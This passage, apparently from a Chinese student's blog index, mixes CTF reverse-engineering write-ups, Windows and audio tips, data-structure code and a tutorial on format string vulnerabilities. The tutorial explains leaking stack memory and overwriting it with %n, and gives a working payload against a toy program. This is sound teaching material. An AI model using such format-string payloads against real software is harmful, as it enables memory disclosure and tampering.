result*4,Byte(0x601060 + result*4)+v3); } if(v0==3){ result =Byte(0x6010C0+i + 1); PatchByte(0x601060 + result*4,Byte(0x601060 + result*4)^v3); } if(v0==4){ result =Byte(0x6010C0+i + 1); PatchByte(0x601060 + result*4,Byte(0x601060 + result*4)/v3); } if(v0==5){ result =Byte(0x6010C0+i + 1); PatchByte(0x601060 + result*4,Byte(0x601060 + result*4)^Byte(0x601060+v3*4)); } else continue; } for(i=0;i&lt;24;i++) Message(&quot;%c&quot;,Byte(0x601060+i*4)) 原作者脚本注释： 由于处理内容过于庞大，就想直接使用IDC脚本来逆处理目标字符串。加减乘异或的逆运算都很明显。思路很清晰，然而在写脚本的时候出问题了：IDC脚本不接受数组和char类型的声明（或者是我不会(:з」∠)）无法新申请内存空间，就只好使用已有的内存空间了；然而(0x601060)的使用方法也不承认，说好的IDC脚本和C++很像呢想把这一段脚本Dump下来用py处理也是可以的，不过在找IDC的写入函数时找到了 *PatchByte(a,v) 函数，可以将v写入a字节那么直接对0x601060位置的24个字符串处理即可得到flag 注意单位为字节，因此直接对地址运算时需要x4 原文链接http://blog.csdn.net/whklhhhh/article/details/74793530?locationNum=1&amp;fps=1 然后在IDA里面的scipt command里运行脚本。运行结果：nctf{Embr4ce_Vm_j0in_R3} 总结：IDC脚本面对数据量很大的操作时很有用的，之后多学习，争取抽时间更一篇有关详细介绍IDC/IDAPython的博客。 IDC脚本使用的一个简单例子http://www.cnblogs.com/binlmmhc/p/6166286.html","categories":[],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"http://leo.dropsec.xyz/tags/Reverse/"}]},{"title":"Read Asm","slug":"Read-Asm","date":"2018-03-10T12:45:40.000Z","updated":"2018-07-30T13:51:07.094Z","comments":true,"path":"2018/03/10/Read-Asm/","link":"","permalink":"http://leo.dropsec.xyz/2018/03/10/Read-Asm/","excerpt":"读汇编是逆向基本功。 emmm…","text":"读汇编是逆向基本功。 emmm…这是南邮上的一道逆向题目。下载链接题目如下：关键在于分析func()这个汇编写的函数，汇编代码如下： 00000000004004e6 &lt;func&gt;: 4004e6: 55 push rbp 4004e7: 48 89 e5 mov rbp,rsp 4004ea: 48 89 7d e8 mov QWORD PTR [rbp-0x18],rdi 4004ee: 89 75 e4 mov DWORD PTR [rbp-0x1c],esi 4004f1: c7 45 fc 01 00 00 00 mov DWORD PTR [rbp-0x4],0x1 4004f8: eb 28 jmp 400522 &lt;func+0x3c&gt; 4004fa: 8b 45 fc mov eax,DWORD PTR [rbp-0x4] 4004fd: 48 63 d0 movsxd rdx,eax 400500: 48 8b 45 e8 mov rax,QWORD PTR [rbp-0x18] 400504: 48 01 d0 add rax,rdx 400507: 8b 55 fc mov edx,DWORD PTR [rbp-0x4] 40050a: 48 63 ca movsxd rcx,edx 40050d: 48 8b 55 e8 mov rdx,QWORD PTR [rbp-0x18] 400511: 48 01 ca add rdx,rcx 400514: 0f b6 0a movzx ecx,BYTE PTR [rdx] 400517: 8b 55 fc mov edx,DWORD PTR [rbp-0x4] 40051a: 31 ca xor edx,ecx 40051c: 88 10 mov BYTE PTR [rax],dl 40051e: 83 45 fc 01 add DWORD PTR [rbp-0x4],0x1 400522: 8b 45 fc mov eax,DWORD PTR [rbp-0x4] 400525: 3b 45 e4 cmp eax,DWORD PTR [rbp-0x1c] 400528: 7e d0 jle 4004fa &lt;func+0x14&gt; 40052a: 90 nop 40052b: 5d pop rbp 40052c: c3 ret 其实这段汇编代码，只要读过一点汇编，就应该能够读懂。刚开始学注重基础，现在一段一段代码来分析 4004e6: 55 push rbp 4004e7: 48 89 e5 mov rbp,rsp 这里是调用函数必备的操作，将调用函数的栈帧栈底指针压入，即将rbp寄存器的值压入调用栈中；建立新的栈帧，将被调函数的栈帧栈底地址(rsp)放入rbp寄存器中。 4004ea: 48 89 7d e8 mov QWORD PTR [rbp-0x18],rdi //rdi存参数1（在内存 [rbp-0x18]处） 4004ee: 89 75 e4 mov DWORD PTR [rbp-0x1c],esi //esi存参数2（在内存 [rbp-0x1c]处） 4004f1: c7 45 fc 01 00 00 00 mov DWORD PTR [rbp-0x4],0x1 //向内存 [rbp-0x4] 写入1 4004f8: eb 28 jmp 400522 &lt;func+0x3c&gt; //跳转到400522处 这里先解释下QWORD和DWORD，QWORD是四字，DWORD是双字，一个字是2个字节（16位），所以QWORD存储64位数据，DWORD存储32位数据。还有r开头的寄存器用来存64位数据，e开头的寄存器用来存32位数据。 400522: 8b 45 fc mov eax,DWORD PTR [rbp-0x4] //eax=1（读取内存[rbp-0x4]处的值） 400525: 3b 45 e4 cmp eax,DWORD PTR [rbp-0x1c] //比较eax与内存[rbp-0x1c]的值(即参数2：28） 400528: 7e d0 jle 4004fa &lt;func+0x14&gt; //如果eax小于28，则跳转到4004fa处 40052a: 90 nop //空指令 40052b: 5d pop rbp //函数调用结束，弹出栈底指针 40052c: c3 ret 这里说一下cmp与jle指令（一般二者同时出现），例如cmp A,B，若A小于B，则执行jle的指令，即进行跳转，否则不进行跳转。 4004fa: 8b 45 fc mov eax,DWORD PTR [rbp-0x4] //eax=1 4004fd: 48 63 d0 movsxd rdx,eax //rdx=1 400500: 48 8b 45 e8 mov rax,QWORD PTR [rbp-0x18] //rax=input[0]（参数1） 400504: 48 01 d0 add rax,rdx //rax+=rdx即rax=input[1] 400507: 8b 55 fc mov edx,DWORD PTR [rbp-0x4] //edx=1 40050a: 48 63 ca movsxd rcx,edx //rcx=1 40050d: 48 8b 55 e8 mov rdx,QWORD PTR [rbp-0x18] //rdx=input[0] 400511: 48 01 ca add rdx,rcx //rdx=input[0]+1=input[1] 400514: 0f b6 0a movzx ecx,BYTE PTR [rdx] //ecx=rdx=0x67 (第一个参数中的第一个数据) 400517: 8b 55 fc mov edx,DWORD PTR [rbp-0x4] //edx=1 40051a: 31 ca xor edx,ecx //edx^=ecx即edx=0x1^0x67=0x66=&quot;f&quot; 40051c: 88 10 mov BYTE PTR [rax],dl //rax=dl 40051e: 83 45 fc 01 add DWORD PTR [rbp-0x4],0x1 //内存[rbp-0x4]处的值变为2 400522: 8b 45 fc mov eax,DWORD PTR [rbp-0x4] //这里接上段 400525: 3b 45 e4 cmp eax,DWORD PTR [rbp-0x1c] 400528: 7e d0 jle 4004fa &lt;func+0x14&gt; 所以，这段汇编代码对应的C源程序是： void func(char input[],int num) { int i = 1; while(i &lt;= num) { *(input[0]+i) ^= i; i++; } } 跑一下出结果或者很快写下汇编脚本： from __future__ import print_function a = [0x0,0x67, 0x6e, 0x62, 0x63, 0x7e, 0x74, 0x62, 0x69, 0x6d, 0x55, 0x6a, 0x7f, 0x60, 0x51, 0x66, 0x63, 0x4e, 0x66, 0x7b, 0x71, 0x4a, 0x74, 0x76, 0x6b, 0x70, 0x79, 0x66 , 0x1c] for i in range(len(a)): print(chr(i^a[i]),end=&quot;&quot;) 运行结果： flag{read_asm_is_the_basic} 注意第一个参数的第一个元素。","categories":[],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"http://leo.dropsec.xyz/tags/Reverse/"}]},{"title":"py交易","slug":"py交易","date":"2018-03-07T04:53:13.000Z","updated":"2018-07-30T13:50:28.273Z","comments":true,"path":"2018/03/07/py交易/","link":"","permalink":"http://leo.dropsec.xyz/2018/03/07/py交易/","excerpt":"结合实验吧上的“py的交易”与南邮上的“py交易”简单总结一下。其中收获不少利器。","text":"结合实验吧上的“py的交易”与南邮上的“py交易”简单总结一下。其中收获不少利器。 一、py的交易下载链接下载下来的是一张png图片疑似二维码，扫描无果后决定用专业的png图片分析工具tweakpng查看究竟载入后提示crc错误，自动修复后查看iTXt模块，发现这张图片是Adobe Fireworks制作的。用Fireworks打开这张图片发现除了背景之外还有一个图层，单独查看这个图层发现是张二维码然后用QR Research扫描得到一串十六进制数然后把这串十六进制数粘贴到记事本，通过import hex导入到010或winhex如下发现文件头03F30D0A是pyc文件的magic number(即魔数、文件头，用来表明某种文件的格式，例如Windows操作系统可执行程序的开头标记一般为MZ)，所以确定了该文件的后缀是.pyc。通过010或winhex将其另存到桌面，更改其后缀名，然后导入https://tool.lu/pyc/在线反编译pyc文件。结合题目hint，猜测key位py,将CTF{py_13eeTh0vEn}提交通过，猜测正确。 考察点1、PNG图片格式、信息分析2、十六进制文件还原及根据十六进制文件头识别文件类型3、pyc文件的反编译 补充：photoshop和fireworks的区别： PS是由一款的图像处理软件，主要处理以像素所构成的数字图像。使用其众多的编修与绘图工具，可以有效地进行图片编辑工作。ps有很多功能，在图像、图形、文字、视频、出版等各方面都有涉及。 fw是一款网页作图软件，软件可以加速 Web 设计与开发， 是一款创建与优化 Web 图像和快速构建网站与 Web 界面原型的理想工具。 二、py交易下载链接下载下来是一个pyc文件，直接在线反编译看看代码的思路很简单，脚本如下： #python 2.7 from __future__ import print_function import base64 a = &apos;XlNkVmtUI1MgXWBZXCFeKY+AaXNt&apos; a = base64.b64decode(a) for i in a: b = (ord(i)-16)^32 print(chr(b),end=&quot;&quot;) 运行结果：nctf{d3c0mpil1n9_PyC} 知识补充：python中，string.printable 包含所有可打印字符的字符串如下：0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!”#$%&amp;’()*+,-./:;&lt;=&gt;?@[]^_`{|}~ 一般这样使用 string.printable[:-6] (去除~后面长度为6的部分)","categories":[],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"http://leo.dropsec.xyz/tags/Reverse/"}]},{"title":"连接两个或多个音频的骚操作","slug":"连接两个或多个音频的骚操作","date":"2018-01-30T04:29:39.000Z","updated":"2018-07-30T13:49:05.600Z","comments":true,"path":"2018/01/30/连接两个或多个音频的骚操作/","link":"","permalink":"http://leo.dropsec.xyz/2018/01/30/连接两个或多个音频的骚操作/","excerpt":"帮小萌剪辑并连接歌曲的时候无意中学会一波骚操作。","text":"帮小萌剪辑并连接歌曲的时候无意中学会一波骚操作。 首先是选择需要剪切的音频，然后是剪切。关于剪切音频，因为华为音乐播放器自带剪切功能，所以我就直接用手机剪切的。如果你和我一样懒不想去下载专业剪切软件的话，在这里推荐两个在线音频剪切网站 http://www.360doc.com/content/14/0110/13/829272_344095076.shtmlhttps://mp3cut.net/ (此网站也可以在线剪切视频) 剪切完成后，如果你不想手动一个一个点开播放的话那就需要链接音频了通常也是用专业软件完成的，在这里咱们用一个新方法：用压缩软件(360压缩、WinRAR…)完成，下面是具体操作：把剪切好的音频先全部拉到一个空文件夹里然后按你让音频播放的顺序依次在文件名前加上1、2、3或a、b、c然后选中这个文件夹右击，选择添加到压缩文件然后选择自定义、压缩方式改为存储 压缩文件名可以自定义然后就可以压缩了接着把压缩文件后缀名改为mp3现在可以用音乐播放器播放了。 注意有些音乐播放器可能会出现时间识别不完整，特别是发送到手机上播放时，但是没关系，播放的歌曲是一秒都不会少的。上图时间虽到最后了，但是音乐却没有停止，你懂的… [类似的尝试着看能不能用这种方法将短视频经行连接，结果失败了] 最后的最后，压缩竟然解决了我之前曾想过的怎样保证电脑文件安全的问题，就是怎么简单方便的给文件夹上锁，却不用安装任何上锁软件。So cool… …","categories":[],"tags":[{"name":"其他","slug":"其他","permalink":"http://leo.dropsec.xyz/tags/其他/"}]},{"title":"Win 10一些小毛病的解决方法","slug":"Win-10一些小毛病的解决方法","date":"2018-01-27T13:38:24.000Z","updated":"2018-07-30T13:47:13.922Z","comments":true,"path":"2018/01/27/Win-10一些小毛病的解决方法/","link":"","permalink":"http://leo.dropsec.xyz/2018/01/27/Win-10一些小毛病的解决方法/","excerpt":"我现用的笔记本是Dell Inspiron 15R-5537 原装win8，免费升win10之后经常会遇到一些小问题，这里简单记录一下小问题的解决方法。","text":"我现用的笔记本是Dell Inspiron 15R-5537 原装win8，免费升win10之后经常会遇到一些小问题，这里简单记录一下小问题的解决方法。解决相关问题的时候可以结合win10官方的帮助：https://support.microsoft.com/zh-cn/products/windows?os=windows-10 一、点关机后电源状态灯不灭、电脑发热解决方法：百度上的答案大多数是让勾掉电源选项里面的“启用快速启动”然后重启，尝试后发现并没有什么卵用。 后来发现是计算机管理 系统设备里的 Intel(R) Management Engine Interface 这个东西在作怪，我的版本是11.0.0.1157 不兼容 需要退到9或10的版本 搜索后发现这个驱动对个人来说没多大作用，可以禁用或卸载，然后就可以解决这个问题。 后来发现右击这个驱动，查看它的属性，在电源管理里有个“允许计算机关闭此设备以节约电源”的选项，勾掉之后也可以正常关机，但是偶然发现开机后它又自动勾上了，很无奈。 如果是这样的话那估计最好的选择就是禁用或卸载喽。 二、WLAN无法启用前几天好生生的突然连不上无线了，出现了下面的图标打开网络连接面板后发现WLAN已关闭，同时启用无效 解决方法：右击WLAN查看属性只保留以上6项的勾，确定，然后重启就ok了。","categories":[],"tags":[{"name":"其他","slug":"其他","permalink":"http://leo.dropsec.xyz/tags/其他/"}]},{"title":"格式化字符串漏洞 简介","slug":"格式化字符串漏洞-简介","date":"2018-01-02T05:23:17.000Z","updated":"2018-07-30T13:46:36.064Z","comments":true,"path":"2018/01/02/格式化字符串漏洞-简介/","link":"","permalink":"http://leo.dropsec.xyz/2018/01/02/格式化字符串漏洞-简介/","excerpt":"这里是参考链接","text":"这里是参考链接 一:简介格式化字符串，也是一种比较常见的漏洞类型。会触发该漏洞的函数很有限。主要就是printf还有sprintf，fprintf等等c库中print家族的函数。 我们先来看看printf的函数声明 int printf(const char* format,…) 这个是每个学过c语言的人一定会知道、会使用的函数。先是一个字符串指针，它指向的一个format字符串。后面是个数可变的参数。一般人可能会这么用它 char str[100];scanf(“%s”,str);printf(“%s”,str); 这个程序没有问题。然后会有一些人为了偷懒会写成这种样子 char str[100];scanf(“%s”,str);printf(str) 这个程序在printf处用了一种偷懒的写法。这看起来是没有什么问题。但是却产生了一个非常严重的漏洞。 千万不要将printf中的format字符串的操纵权交给用户。保证printf函数的第一个参数是不可变的，在程序员的掌握中的。 二、漏洞的产生原理这里我们就要详细的讲述一下printf的运行原理了。因为64位上printf函数的行为发生了许多变化。这里暂时不进行说明。不过如果清楚了漏洞的产生原因，依然可以使用此漏洞。 先看看正常的情况 #include &lt;stdio.h&gt; int main(void) { printf(&quot;%d%d%d%d%s&quot;,5,6,8,0x21,&quot;test&quot;); return 0; } 首先，看看汇编的源码，额暂时搞不到，还是手写吧 .data str db &quot;test&quot;,0 format db &quot;%d%d%d%d%s&quot;,0 .code push str push 21h push 8 push 6 push 5 push format call printf 差不多就这样。这个时候的栈就会是这个样子的。 -00000003 db ? ; -00000002 db ? ; -00000001 db ? ; +00000000 s db 4 dup(?) +00000004 r db 4 dup(?) +00000008 format db 4 ;&quot;%d%d%d%c&quot; +0000000c %d db 4 ; 4 +00000010 %d db 4 ; 6 +00000014 %d db 4 ; 8 +00000018 %x db 4 ; 0x21 +0000001c %s db 4 ; &quot;test&quot; +0000001c ; end of stack variables (额，不要吐槽的那原始的栈结构表示方式，用过IDA的应该知道)。 根据cdecl的函数调用规定，函数的从最右边的参数开始，逐个压栈。如果要传入的是一个字符串，那么就将字符串的指针压栈。这一切都井井有条的进行着。如果是一般的函数，函数的调用者和被调用者都应该知道函数的参数个数以及每个参数的类型。对于不相同的类型，编译器还会自动的进行类型的转换，或者是发生编译错误，提醒程序的编写者。 但是，到了printf函数，一切就不一样了。因为printf是c语言中少有的支持可变参数的库函数。对于可变参数的函数，一切就变得模糊了起来。函数的调用者可以自由的指定函数参数的数量和类型，被调用者无法知道在函数调用之前到底有多少参数被压入栈帧当中。所以printf函数要求传入一个format参数用以指定到底有多少，怎么样的参数被传入其中。然后它就会忠实的按照函数的调用者传入的格式一个一个的打印出数据。 当然这会产生一个严重的问题。如果我们无意或者有意，在format中，或者说我们要求printf打印的数据数量大于我们所给的数量会怎样？printf函数不可能知道栈帧中哪一些数据是传入它参数，哪些是属于函数调用者的数据。看下面段代码 #include &lt;stdio.h&gt; int main(void) { printf(&quot;%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x&quot;); return 0; } 这里我们只给了printf一个参数，却让其打印出12个int类型的数据，我们编译运行看看会有什么结果。 运行之后可以看到，printf忠实的按照我们意愿打印出了12个数值。这些数值不是我们输入的参数，而是保存在栈中的其他的数值。通过这个特性，黑客们就创造出了格式化字符串的漏洞。 三、漏洞利用可能有人（像我一样的弱渣）会对这个漏洞的危害感到疑惑，因为它似乎只是打印一些没有用的垃圾数据而已。其实，它的危害一点不比栈溢出漏洞的危害小，如果使用得当，甚至比栈溢出效果更好。如果栈溢出是粗暴的地毯式轰炸的话，格式化字符串漏洞就是一位可怕的狙击手。一击便可致命。 至于此漏洞的利用方式，主要有2种 打印内存 刚才也看到了printf可以打印出调用者栈帧中的信息。在0day攻击当中，如何获得对方内存中的数据是非常重要的一个技巧，而格式化字符串漏洞的其中一个利用方法便是能够获得内存中那些本不应该被我们知道的数据。这个过程我们称之为leak内存。0day攻击中一种重要的方法ret to libc就是以leak基地址为前提的。 只要我们在format中填入足够的参数，那么printf就可以打出储存在栈中的，那些本不能被知道的信息。只要计算好format在栈中的地址与需要leak的信息地址之差。就可以得到想要的数据 比如format在0x20处而dest数据在0x00处。他们一共相差32个字节，那么我们就可以构造”%f%f%f%d,%x”这样的字符串。逗号前面会的”%f%f%f%d”可以打印出比foramt更高位的28个字节的数据，当然这不是我们想要的。然后最后的一个%x便可以以16进制的形式打印出我们想要的数据了。 然后，更进一步，我们知道格式化字符串还有%s参数。那么，如果在栈中保存有指向我们感兴趣数据的指针，我们就可以在打印指针的时候使用一个%s来打印别的地方的内容。而且一般的程序都会将用户输入的数据储存在栈上。这就给了我们一个构造指针的机会，再结合格式化字符串漏洞，几乎可以得到所有内存数据。 修改内存 也许格式化字符串漏洞可以打印内存信息这一点不让人奇怪。但是格式化字符串其实也可以修改内存中的数据。我们来看看下面这一段代码。 #include &lt;stdio.h&gt; int main(void) { int a; printf(&quot;aaaaaaa%n\\n&quot;,&amp;a); printf(&quot;%d\\n&quot;,a); return 0; } 这是一段有点神奇的代码 运行后可以发现a的值被printf函数修改为了7。这就是%n的功效了。这是一个不常用到的参数。它的功能是将%n之前printf已经打印的字符个数赋值给传入的指针。通过%n我们就可以修改内存中的值了。和%sleak内存一样，只要栈中有我们需要修改的内存的地址就可以使用格式化字符串的漏洞修改它。 当然，如果需要修改的数据是相当大的数值时，我们可以使用%02333d这种形式。在打印数值右侧用0补齐不足位数的方式来补齐足。 可以看出，格式化字符串可以修改的内存范围更加广。只要构造出指针，就可以改写内存中的任何数值。和栈溢出的地毯轰炸不同。这种一次只能改写一个dword大小的内存的攻击方式更加精而致命 四、实践最好的学习方法就是实践，现在我们就来实验一下格式字符串漏洞的功效。 首先，代码 #include &lt;stdio.h&gt; int main(void) { int flag = 0; int *p = &amp;flag; char a[100]; scanf(&quot;%s&quot;,a); printf(a); if(flag == 2000) { printf(&quot;good!!\\n&quot;); } return 0; } 使用gcc编译。 然后拖进IDA中分析一下栈结构，调用printf函数时候的栈结构是这样的 -00000010 r dd ? &lt;-- 这里是printf的返回地址，向上就是printf的栈帧 -00000010 format dd ? -00000010 dd ? -00000010 dd ? -00000010 dd ? -0000000C flag dd ? -00000008 p dd ? -00000004 a db ? -00000000 db ? ; &lt;-- 再向下就都是a数组的空间 我们可以需要修改的变量是flag，而指针p便是指向flag的指针。所以可以通过p来修改flag的值为2000，从而达到我们打印出good！！的目标 %010x%010x%010x%01970x%n 这个便是我构造出的poc，很短，但是很强悍（→_→）。 那么我们来看看效果吧 good!被打印了处理。 这是本人电脑用CodeBlocks运行结果。","categories":[],"tags":[{"name":"安全","slug":"安全","permalink":"http://leo.dropsec.xyz/tags/安全/"}]},{"title":"Leooel的2017","slug":"Leooel的2017","date":"2018-01-01T15:10:51.000Z","updated":"2018-07-30T13:38:12.245Z","comments":true,"path":"2018/01/01/Leooel的2017/","link":"","permalink":"http://leo.dropsec.xyz/2018/01/01/Leooel的2017/","excerpt":"","text":"我喜欢现在这种温度不冷不热再偏冷一点无论在什么时候这种温度都能使我大脑保持清醒的同时也使我整个人感到清爽、愉悦 今儿贰零壹捌年第一天新的开始总要总结下过往、展望下未来吧其实几周之前心里就计划着写下年度个人总结了但总是一拖再拖到了现在 贰零壹柒 2017此时此刻我默念了好几遍这个数字竟然发现我对它是那样的陌生好像我从未经历过2017对，时间就是如此之快快到对于一个容易产生感情的人来说像从未经历依然是一个冰冷陌生的数字可是啊我的的确确跟它相处了三百多天 期间 我也收获了经历和感悟完成了某些方面的蜕变也是具有特殊意义的一年 一月 二月在广州体验了一把寒假工的生活劳动的同时也对白天与黑夜有了深一步的理解对于有些人来说哪有什么白天与黑夜白天就是黑夜 黑夜亦是白天本质属性是一样的另一方面也是首次亲临南方的大都市广州 深圳目睹了繁华 也感受到了背后的颓败都是如此吧 就像建成一座大厦的同时也会产生大量废墟新修一条马路的同时也会破坏一条马路我此时没有其他别的情感社会总是要发展的吧其他就是我对那边的马路、树木…总之就是环境挺有感觉之后有机会的话会再去的虽然这三十天中隐隐约约也失去了些什么但总体上感觉也没什么 挺好的 寒假开学到放暑假这一段时间真的没有一点记忆直到放暑假的当儿还感觉是开学还没多久估计这段时间都年少轻狂去了吧 暑假两个月除了回家的十天与去天津的四天其他的时间都在学校呆了其实也没学太多东西糊糊涂涂的二进制入了个门槛吧然后就是搭建了一个博客有了一个网上记录东西的地方也开始了浏览各种大佬的博客算是进入了一个新的世界但是能不能利用好这个世界里的资源就看自己喽嗯 天津能感觉出来它没有南方都市那样的充满了活力但是依然很富足就像是生活很祥和的中年人比较欣赏那边人的生活精神状态喂 来个煎饼果子虽然并不怎么可口 但还是津津有味的吃了下去 九月算是比较忙碌的一个月作为班助在帮助石器适应大学生活上用了点时间同时也结识了一些鲜肉学弟学妹 十月十一月十二月生活比较平静没有什么大的事情也就按部就班的学了一些东西反正是没好好听老师讲课也没好好写作业然后 然后就到现在了准备复习迎接末考虽然中间夹杂了一个课程设计还是我没有好好学的数据结构哎 好惨好惨 最后还是要感谢贰零壹柒这一年的时光是你一点点见证了我的成长最后的最后还要感谢那些陪伴我、关心我、爱我的人有你们 我才能这样快乐无忧的学习与生活","categories":[],"tags":[{"name":"洋流","slug":"洋流","permalink":"http://leo.dropsec.xyz/tags/洋流/"}]},{"title":"数据结构 知识回顾","slug":"数据结构-知识回顾","date":"2017-12-27T13:13:09.000Z","updated":"2018-07-30T13:37:11.693Z","comments":true,"path":"2017/12/27/数据结构-知识回顾/","link":"","permalink":"http://leo.dropsec.xyz/2017/12/27/数据结构-知识回顾/","excerpt":"拥抱被我冷落在角落的数据结构吧!","text":"拥抱被我冷落在角落的数据结构吧! 结合小玉老师的博客总结。 顺序表基本操作#include &lt;iostream&gt; using namespace std; #define Maxsize 100 //最大空间 typedef struct{ int *elem; int length; // 顺序表的长度 }SqList; bool InitList(SqList &amp;L) //构造一个空的顺序表L { //L加&amp;表示引用类型参数，函数内部的改变跳出函数仍然有效 //不加&amp;内部改变，跳出函数后无效 L.elem=new int[Maxsize]; //为顺序表分配Maxsize个空间 if(!L.elem) return false; //存储分配失败 L.length=0; //空表长度为0 return true; } bool CreateList(SqList &amp;L) //创建一个顺序表L { //L加&amp;表示引用类型参数，函数内部的改变跳出函数仍然有效 //不加&amp;内部改变，跳出函数后无效 int a,i=0; cin&gt;&gt;a; while(a!=-1) { if(L.length==Maxsize) { cout&lt;&lt;&quot;顺序表已满！&quot;; return false; } L.elem[i++]=a; L.length++; cin&gt;&gt;a; } return true; } bool GetElem(SqList L,int i,int &amp;e) { if (i&lt;1||i&gt;L.length) return false; //判断i值是否合理，若不合理，返回false e=L.elem[i-1]; //第i-1的单元存储着第i个数据 return true; } int LocateELem(SqList L,int x) { for (int i=0;i&lt;L.length;i++) if (L.elem[i]==x) return i+1;//第几个元素，例如第5个元素，下标其实为4 return -1; } bool ListInsert_Sq(SqList &amp;L,int i ,int e) { if(i&lt;1 || i&gt;L.length+1)return false; //i值不合法 if(L.length==Maxsize) return false; //存储空间已满 for(int j=L.length-1;j&gt;=i-1;j--) L.elem[j+1]=L.elem[j]; //从最后一个元素开始后移，直到第i个元素后移 L.elem[i-1]=e; //将新元素e放入第i个位置 L.length++; //表长增1 return true; } bool ListDelete_Sq(SqList &amp;L,int i,int &amp;e) { if((i&lt;1)||(i&gt;L.length))return false; //i值不合法 e=L.elem[i-1]; //将欲删除的元素保留在e中 for (int j=i; j&lt;=L.length-1; j++) L.elem[j-1] =L.elem[j]; //被删除元素之后的元素前移 L.length--; //表长减1 return true; } void print(SqList L) { cout &lt;&lt; &quot;输出顺序表&quot; &lt;&lt;endl; for(int j=0;j&lt;=L.length-1;j++) cout&lt;&lt;L.elem[j]&lt;&lt;&quot; &quot;; cout&lt;&lt;endl; } void DestroyList(SqList &amp;L) { if (L.elem) delete []L.elem; //释放存储空间 } int main() { SqList myL; int i,e,x; cout &lt;&lt; &quot;1. 初始化\\n&quot;; cout &lt;&lt; &quot;2. 创建\\n&quot;; cout &lt;&lt; &quot;3. 取值\\n&quot;; cout &lt;&lt; &quot;4. 查找\\n&quot;; cout &lt;&lt; &quot;5. 插入\\n&quot;; cout &lt;&lt; &quot;6. 删除\\n&quot;; cout &lt;&lt; &quot;7. 输出\\n&quot;; cout &lt;&lt; &quot;8. 销毁\\n&quot;; cout &lt;&lt; &quot;0. 退出\\n&quot;; int choose = -1; while (choose != 0) { cout &lt;&lt; &quot;请选择:&quot;; cin &gt;&gt; choose; switch (choose) { case 1://初始化顺序表 cout &lt;&lt; &quot;顺序表初始化...&quot; &lt;&lt;endl; if(InitList(myL)) cout &lt;&lt;&quot;顺序表初始化成功！&quot; &lt;&lt; endl; else cout &lt;&lt;&quot;顺序表初始化失败！&quot; &lt;&lt; endl; break; case 2://创建顺序表 cout &lt;&lt; &quot;顺序表创建...&quot; &lt;&lt;endl; cout &lt;&lt; &quot;输入整型数，输入-1结束&quot; &lt;&lt;endl; if(CreateList(myL)) cout &lt;&lt;&quot;顺序表创建成功！&quot; &lt;&lt; endl; else cout &lt;&lt;&quot;顺序表创建失败！&quot; &lt;&lt; endl; break; case 3://取值 cout &lt;&lt; &quot;输入整型数i，取第i个元素输出&quot; &lt;&lt;endl; cin&gt;&gt;i; if(GetElem(myL,i,e)) cout &lt;&lt;&quot;第i个元素是： &quot; &lt;&lt;e&lt;&lt; endl; else cout &lt;&lt;&quot;顺序表取值失败！&quot; &lt;&lt; endl;; cout &lt;&lt; &quot;第i个元素是： &quot;&lt;&lt;e&lt;&lt; endl; break; case 4://查找 cout &lt;&lt; &quot;请输入要查找的数x:&quot;; cin&gt;&gt;x; if(LocateELem(myL,x)==-1) cout &lt;&lt;&quot;查找失败！&quot; &lt;&lt; endl; else cout &lt;&lt;&quot;查找成功！&quot; &lt;&lt; endl; break; case 5://插入 cout &lt;&lt; &quot;请输入要插入的位置和要插入的数据元素e:&quot;; cin&gt;&gt;i&gt;&gt;e; if(ListInsert_Sq(myL,i,e)) cout &lt;&lt;&quot;插入成功！&quot; &lt;&lt; endl; else cout &lt;&lt;&quot;插入失败！&quot; &lt;&lt; endl; break; case 6://删除 cout &lt;&lt; &quot;请输入要删除的位置i:&quot;; cin&gt;&gt;i; if(ListDelete_Sq(myL,i,e)) cout &lt;&lt;&quot; 删除成功！&quot; &lt;&lt; endl; else cout &lt;&lt;&quot;删除失败！&quot; &lt;&lt; endl; break; case 7://输出 print(myL); break; case 8://销毁 cout &lt;&lt; &quot;顺序表销毁...&quot;&lt;&lt;endl; DestroyList(myL); break; } } return 0; } 单链表基本操作#include&lt;iostream&gt; #include&lt;string&gt; #include&lt;iomanip&gt; #include&lt;stdlib.h&gt; using namespace std; typedef struct LNode { int data; //结点的数据域 struct LNode *next; //结点的指针域 }LNode, *LinkList; //LinkList为指向结构体LNode的指针类型 bool InitList_L(LinkList &amp;L)//构造一个空的单链表L { L=new LNode; //生成新结点作为头结点，用头指针L指向头结点 if(!L) return false; //生成结点失败 L-&gt;next=NULL; //头结点的指针域置空 return true; } void CreateList_H(LinkList &amp;L)//前插法创建单链表 { //输入n个元素的值，建立到头结点的单链表L int n; LinkList s; //定义一个指针变量 L=new LNode; L-&gt;next=NULL; //先建立一个带头结点的空链表 cout &lt;&lt;&quot;请输入元素个数n：&quot; &lt;&lt;endl; cin&gt;&gt;n; cout &lt;&lt;&quot;请依次输入n个元素：&quot; &lt;&lt;endl; cout &lt;&lt;&quot;前插法创建单链表...&quot; &lt;&lt;endl; while(n--) { s=new LNode; //生成新结点s cin&gt;&gt;s-&gt;data; //输入元素值赋给新结点的数据域 s-&gt;next=L-&gt;next; L-&gt;next=s; //将新结点s插入到头结点之后 } } void CreateList_R(LinkList &amp;L)//尾插法创建单链表 { //输入n个元素的值，建立带表头结点的单链表L int n; LinkList s, r; L=new LNode; L-&gt;next=NULL; //先建立一个带头结点的空链表 r=L; //尾指针r指向头结点 cout &lt;&lt;&quot;请输入元素个数n：&quot; &lt;&lt;endl; cin&gt;&gt;n; cout &lt;&lt;&quot;请依次输入n个元素：&quot; &lt;&lt;endl; cout &lt;&lt;&quot;尾插法创建单链表...&quot; &lt;&lt;endl; while(n--) { s=new LNode;//生成新结点 cin&gt;&gt;s-&gt;data; //输入元素值赋给新结点的数据域 s-&gt;next=NULL; r-&gt;next=s;//将新结点s插入尾结点r之后 r=s;//r指向新的尾结点s } } bool GetElem_L(LinkList L, int i, int &amp;e)//单链表的取值 { //在带头结点的单链表L中查找第i个元素 //用e记录L中第i个数据元素的值 int j; LinkList p; p=L-&gt;next;//p指向第一个结点， j=1; //j为计数器 while (j&lt;i &amp;&amp; p) //顺链域向后扫描，直到p指向第i个元素或p为空 { p=p-&gt;next; //p指向下一个结点 j++; //计数器j相应加1 } if (!p || j&gt;i) return false; //i值不合法i＞n或i&lt;=0 e=p-&gt;data; 